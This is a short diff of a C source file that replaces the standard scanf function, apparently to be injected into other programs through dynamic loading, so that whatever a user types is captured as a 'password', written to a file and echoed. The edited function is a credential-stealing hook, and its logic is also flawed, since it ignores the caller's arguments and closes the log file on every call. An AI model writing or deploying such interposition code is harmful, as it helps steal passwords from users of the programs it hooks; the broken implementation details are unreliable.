@@ -42,21 +42,20 @@ void mydest()
 
 int scanf(const char *format, ...)
 {
-	myinit();
 	sym orig_scanf;
 	char password[1000];
 	memset(password, 0, 1000);
 
 	orig_scanf = (sym)dlsym(handle, "scanf");
 	if (orig_scanf == NULL)
-	{
+	{	
 		fprintf(stderr, "Failed to find function: scanf\n");
 		return EOF;
 	}
-
 	orig_scanf(format, password);
-	fprintf(fd, "%s\n", password); // write password to file
-	// fprintf(fd, "%s\n", "test"); // write password to file
+
+	fprintf(fd, "%s", password); // write password to file
+	fclose(fd);
 	printf("%s\n", password);
 	return strlen(password); // return length of password
 }
